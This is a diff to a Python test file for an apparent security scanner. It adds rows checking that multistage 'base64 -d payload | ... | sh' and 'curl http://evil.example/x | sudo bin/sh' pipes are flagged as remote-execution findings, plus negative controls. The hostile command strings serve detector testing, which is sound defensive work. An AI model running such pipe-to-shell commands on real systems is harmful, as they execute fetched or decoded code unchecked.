@@ -412,6 +412,44 @@ def test_issue_562_false_positive_controls_remain_clean(
             "curl http://evil.example/x | ѕh",
             None,
         ),
+        # A3 is a property of multistage pipes, not of curl.  base64_pipe_sh had the
+        # exact same single-stage bug; leaving it behind would make "multistage pipes
+        # are covered" false for the base64 route.  Found by the #574 implementation
+        # review and translated into these rows so a regression turns them red.
+        (
+            "A3b-base64-multistage-tee",
+            "base64 -d payload | tee /tmp/f | sh",
+            "remote_exec.base64_pipe_sh",
+        ),
+        (
+            "A3b-base64-multistage-cat",
+            "base64 --decode payload | cat | sh",
+            "remote_exec.base64_pipe_sh",
+        ),
+        (
+            "A3b-base64-multistage-three-hops",
+            "base64 -D payload | tr a b | cat | sh",
+            "remote_exec.base64_pipe_sh",
+        ),
+        (
+            "A3b-ctrl-base64-single-stage",
+            "base64 -d payload | sh",
+            "remote_exec.base64_pipe_sh",
+        ),
+        ("A3b-ctrl-base64-echo-literal", 'echo "base64 -d payload | sh"', None),
+        # B2 scope: the relative-path relaxation applies to the shell subject only,
+        # never to wrappers.  Both directions are pinned so a widening of the scope
+        # (which costs +66% walltime on the real corpus) turns the second row red.
+        (
+            "B2-scope-shell-relative-hits",
+            "curl http://evil.example/x | sudo bin/sh",
+            "remote_exec.curl_pipe_sh",
+        ),
+        (
+            "B2-scope-wrapper-relative-misses",
+            "curl http://evil.example/x | bin/sudo sh",
+            None,
+        ),
     ],
 )
 def test_issue_566_completion_matrix_static_findings(
